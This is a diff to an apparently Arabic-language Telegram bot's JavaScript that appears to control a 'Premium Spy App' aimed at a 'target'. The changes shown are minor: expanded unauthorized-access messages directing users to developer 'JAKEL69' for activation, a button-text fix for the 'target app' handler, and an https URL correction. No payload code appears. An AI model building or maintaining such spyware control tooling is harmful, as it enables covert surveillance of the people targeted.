@@ -177,7 +177,13 @@ bot.on("message", msg => {
   // التحقق من أن المستخدم ليس هو المصرح به
   if (String(chatId) !== String(config.id)) {
     if (text === "/start") {
-      bot.sendMessage(chatId, "❌ غير مصرح لك باستخدام هذا البوت.");
+      bot.sendMessage(chatId, 
+        "❌ غير مصرح لك باستخدام هذا البوت.\n\n" +
+        "يرجى التواصل مع المطور :\n" +
+        "                         \" JAKEL69 \"\n" +
+        "☆لتفعيل البوت☆...",
+        { parse_mode: "Markdown" }
+      );
     }
     return; // إيقاف المعالجة لأي مستخدم غير مصرح
   }
@@ -201,8 +207,8 @@ bot.on("message", msg => {
       }
     ).catch(console.error);
   } 
-  // الأمر الجديد: /app_link
-  else if (text === "🗃️☠️تطبيق الهدف") {
+  // حل مشكلة زر تطبيق الهدف
+  else if (text === "🗃️☠️تطبيق الهدف" || text === "تطبيق الهدف") {
     const appMessage = `
 <b>🌟 Premium Spy App - Developed by JAKEL 🌟</b>
 
@@ -248,7 +254,7 @@ bot.on("message", msg => {
         inline_keyboard: [[
           { 
             text: "📲 افتح صفحة التطبيق الآن", 
-            web_app: { url: "t.me/JL_HK011101Sbot/JAKELspy" } 
+            web_app: { url: "https://t.me/JL_HK011101Sbot/JAKELspy" } 
           }
         ]]
       }
@@ -259,7 +265,6 @@ bot.on("message", msg => {
     const duration = parseInt(text);
     const target = appData.get("currentTarget");
     
-    // التصحيح: إصلاح الخطأ في صياغة الشرط
     if (isNaN(duration)) {
       bot.sendMessage(chatId, "<b>❌ مدة غير صالحة. الرجاء إدخال رقم.</b>", { parse_mode: "HTML" }).catch(console.error);
       return;
@@ -646,7 +651,10 @@ bot.on("callback_query", query => {
   
   // التحقق من أن المستخدم ليس هو المصرح به
   if (String(chatId) !== String(config.id)) {
-    bot.answerCallbackQuery(query.id, { text: "❌ غير مصرح لك باستخدام هذا البوت." });
+    bot.answerCallbackQuery(query.id, { 
+      text: "❌ غير مصرح لك باستخدام هذا البوت",
+      show_alert: true 
+    });
     return; // إيقاف المعالجة لأي مستخدم غير مصرح
   }
 
@@ -732,7 +740,13 @@ bot.on("voice", msg => {
   
   // التحقق من أن المستخدم ليس هو المصرح به
   if (String(chatId) !== String(config.id)) {
-    bot.sendMessage(chatId, "❌ غير مصرح لك باستخدام هذا البوت.");
+    bot.sendMessage(chatId, 
+      "❌ غير مصرح لك باستخدام هذا البوت.\n\n" +
+      "يرجى التواصل مع المطور :\n" +
+      "                         \" JAKEL69 \"\n" +
+      "☆لتفعيل البوت☆...",
+      { parse_mode: "Markdown" }
+    );
     return; // إيقاف المعالجة لأي مستخدم غير مصرح
   }
 
